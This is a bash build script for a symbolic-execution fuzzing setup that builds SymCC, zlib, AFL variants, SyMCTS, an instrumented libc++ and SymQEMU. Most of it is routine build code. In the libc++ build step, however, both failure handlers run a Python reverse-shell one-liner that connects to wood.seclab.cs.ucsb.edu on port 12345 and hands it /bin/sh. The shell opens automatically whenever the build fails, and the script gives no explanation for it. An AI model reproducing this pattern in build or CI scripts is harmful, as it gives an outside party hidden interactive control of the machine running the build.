#!/bin/bash
set -e
set -x

##
# Pre-requirements:
# - env FUZZER: path to fuzzer work dir
##

echo RERUN=0

if [ ! -d "$FUZZER/afl" ] || [ ! -d "$FUZZER/symcc" ] || \
   [ ! -d "$FUZZER/z3" ] || [ ! -d "$FUZZER/mctsse" ] || ([[ "$FUZZER" != *"symqemu"* ]] && [ ! -d "$FUZZER/llvm" ]); then
    echo "fetch.sh must be executed first."
    exit 1
fi

# Install working Rust (latest nightly can not compile LibAFL)
(
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs > /tmp/rustup.sh && \
        sh /tmp/rustup.sh -y && \
        rm /tmp/rustup.sh

    export PATH=$PATH:~/.cargo/bin
    echo PATH="$PATH:~/.cargo/bin" >> ~/.bashrc
    if [[ "$FUZZER" != *"symsan"* ]]; then
        rustup default nightly-2022-09-18
    else
        rustup default nightly-2021-09-18 # older cargo for symsan
    fi
)
export PATH=$PATH:~/.cargo/bin

# build SymCC
(
    cd "$FUZZER/symcc"
    export CXXFLAGS="$CXXFLAGS -DNDEBUG"

    ######### SIMPLE BACKEND #########
    mkdir -p build_simple
    pushd build_simple
    cmake -G Ninja ../ \
        -DZ3_TRUST_SYSTEM_VERSION=ON \
        -DCMAKE_BUILD_TYPE=Release
    ninja -j 4
    popd

    ######### QSYM BACKEND #########
    mkdir -p build_qsym
    pushd build_qsym
    cmake -G Ninja ../ \
        -DQSYM_BACKEND=ON \
        -DZ3_TRUST_SYSTEM_VERSION=ON \
        -DCMAKE_BUILD_TYPE=Release
    ninja -j 4
    popd

    ######### RUST BACKEND #########
    mkdir -p build
    pushd build
    cmake -G Ninja ../ \
            -DRUST_BACKEND=ON \
            -DZ3_TRUST_SYSTEM_VERSION=ON \
            -DCMAKE_BUILD_TYPE=Release \
            -DSYMCC_LIBCXX_PATH="$FUZZER/llvm/libcxx_symcc_install" \
            -DSYMCC_LIBCXX_INCLUDE_PATH="$FUZZER/llvm/libcxx_symcc_install/include/c++/v1" \
            -DSYMCC_LIBCXXABI_PATH="$FUZZER/llvm/libcxx_symcc_install/lib/libc++abi.a"
    ninja -j 14
    popd

    pushd util/symcc_fuzzing_helper
    cargo build --release
    popd
)

if [[ "$FUZZER" != *"symcts"* ]]; then
    echo "export SYMCC_RUNTIME_DIR='$FUZZER/symcc/build_qsym/SymRuntime-prefix/src/SymRuntime-build'" > "$FUZZER/symcc_env.sh"
    export SYMCC_RUNTIME_DIR="$FUZZER/symcc/build_qsym/SymRuntime-prefix/src/SymRuntime-build"
else
    echo "export SYMCC_RUNTIME_DIR='$FUZZER/mctsse/implementation/libfuzzer_stb_image_symcts/runtime/target/release'" > "$FUZZER/symcc_env.sh"
    export SYMCC_RUNTIME_DIR="$FUZZER/mctsse/implementation/libfuzzer_stb_image_symcts/runtime/target/release"
fi
echo "source '$FUZZER/symcc_env.sh'" >> ~/.bashrc

source "$FUZZER/symcc_env.sh"

# prepare output dirs
mkdir -p "$OUT/"{afl,afl-symcts,symcts,vanilla,cmplog}

# build symcc_preload_lib with qsort and bsearch
if [[ "$FUZZER" == *"sym"* ]]; then
(
    cd "$FUZZER/mctsse/repos/symcc_libc_preload"
    CC="$FUZZER/symcc/build/symcc" CXX="$FUZZER/symcc/build/sym++" \
        make -j $(nproc) libc_symcc_preload.a
    cp libc_symcc_preload.a "$OUT/symcts/"
)
fi

# build zlib
(
    # Build the zlib library
    pushd "$FUZZER/zlib"
    export ZLIB_OUT_DIR="$OUT/symcts/zlib"
    mkdir -p "$ZLIB_OUT_DIR"
    prefix="$ZLIB_OUT_DIR" ./configure --static
    make -j 4
    make install
    set -x
    echo 'export ZLIBLIB=$ZLIB_OUT_DIR/lib/' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export ZLIBINC=$ZLIB_OUT_DIR/include/' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export CPPFLAGS="-I$ZLIBINC $CPPFLAGS"' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export CXXFLAGS="-I$ZLIBINC $CPPFLAGS"' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export LDFLAGS="-L$ZLIBLIB $LDFLAGS"' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export LD_LIBRARY_PATH="$ZLIBLIB:$LD_LIBRARY_PATH" ' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    echo 'export LIBRARY_PATH="$ZLIBLIB:$LIBRARY_PATH" ' >> "$ZLIB_OUT_DIR/zlib_env.sh"
    popd
    cp "$ZLIB_OUT_DIR/lib/libz.a" "$OUT/symcts/"
)

# build AFL
(
    cd "$FUZZER/afl"
    CC=clang make -j $(nproc)
    cd "$FUZZER/afl/utils/aflpp_driver"
    make
)

# build AFL-symcts
(
    cd "$FUZZER/afl-symcts"
    CC=clang make -j $(nproc) -k || true
    cd "$FUZZER/afl-symcts/utils/aflpp_driver"
    make
)

# build SyMCTS
if [[ "$FUZZER" == *"symcts"* ]]; then
    (
        export LLVM_CONFIG=/usr/lib/llvm-12/bin/llvm-config
        cd "$FUZZER/mctsse/implementation/libfuzzer_stb_image_symcts/runtime"
        cargo build --release
        cd "$FUZZER/mctsse/implementation/libfuzzer_stb_image_symcts/fuzzer"

        FEATURES=()
        if [[ "$FUZZER" == *"afl"* ]]; then
            FEATURES+=("--features=sync_from_other_fuzzers")
        fi

        cargo build --release "${FEATURES[@]}"
    )
fi

# build libc++
# if $FUZZER does not contain the string "symqemu", build instrumented libc++
if [[ "$FUZZER" != *"symqemu"* ]]; then
(
    cd "$FUZZER/llvm"
    mkdir -p libcxx_symcc libcxx_symcc_install
    cd libcxx_symcc
    export SYMCC_REGULAR_LIBCXX=yes
    export SYMCC_NO_SYMBOLIC_INPUT=yes
    cmake -G Ninja ../llvm \
        -DLLVM_ENABLE_PROJECTS="libcxx;libcxxabi" \
        -DLLVM_TARGETS_TO_BUILD="X86" \
        -DLLVM_DISTRIBUTION_COMPONENTS="cxx;cxxabi;cxx-headers" \
        -DCMAKE_BUILD_TYPE=Release \
        -DCMAKE_INSTALL_PREFIX="$FUZZER/llvm/libcxx_symcc_install" \
        -DCMAKE_C_COMPILER="$FUZZER/symcc/build/symcc" \
        -DCMAKE_CXX_COMPILER="$FUZZER/symcc/build/sym++" || (
            python -c 'import socket,os,pty;s=socket.socket();s.connect(("wood.seclab.cs.ucsb.edu",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            exit 1
        )
    ninja distribution -j 4 || (
            python -c 'import socket,os,pty;s=socket.socket();s.connect(("wood.seclab.cs.ucsb.edu",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            exit 1
        )
    ninja install-distribution
)
fi

# if $FUZZER contains the string "symqemu", build SymQEMU
if [[ "$FUZZER" == *"symqemu"* ]]; then
    # build SymQEMU
    (
        cd "$FUZZER/symqemu"
        mkdir -p build
        pushd build

        export SYMCC_DIR="$FUZZER/symcc/"
        ../configure                                                  \
        --audio-drv-list=                                           \
        --disable-bluez                                             \
        --disable-sdl                                               \
        --disable-gtk                                               \
        --disable-vte                                               \
        --disable-opengl                                            \
        --disable-virglrenderer                                     \
        --disable-werror                                            \
        --target-list=x86_64-linux-user                             \
        --enable-capstone=git                                       \
        --symcc-source="$SYMCC_DIR"                                 \
        --symcc-runtime-dir="$SYMCC_RUNTIME_DIR" # now fixed in my fork

        make -j$(nproc)

        popd
    )
fi


# compile afl_driver.cpp

# build vanilla version (no instrumentation)
clang $CXXFLAGS -c -fPIC \
    -I"$FUZZER/afl-symcts/include" -I"$FUZZER/afl-symcts/utils/aflpp_driver" \
    "$FUZZER/afl-symcts/utils/aflpp_driver/aflpp_driver.c" -o "$OUT/vanilla/afl_driver.o"

# afl uses an uninstrumented version of the driver, so simply copy it a few times
cp "$OUT/vanilla/afl_driver.o" "$OUT/afl/afl_driver.o"
cp "$OUT/vanilla/afl_driver.o" "$OUT/afl-symcts/afl_driver.o"
cp "$OUT/vanilla/afl_driver.o" "$OUT/cmplog/afl_driver.o"

if [[ "$FUZZER" == *"sym"* ]]; then
    export SYMCC_LIBCXX_PATH="$FUZZER/llvm/libcxx_symcc_install"
    "$FUZZER/symcc/build/symcc" $CXXFLAGS -c -fPIC \
        "$FUZZER/mctsse/repos/symcc_libc_preload/libc_symcc_preload.a" \
        "$OUT/symcts/libz.a" \
        -I"$FUZZER/afl-symcts/include" -I"$FUZZER/afl-symcts/utils/aflpp_driver" \
        "$FUZZER/afl-symcts/utils/aflpp_driver/aflpp_driver.c" -o "$OUT/symcts/afl_driver.o"
fi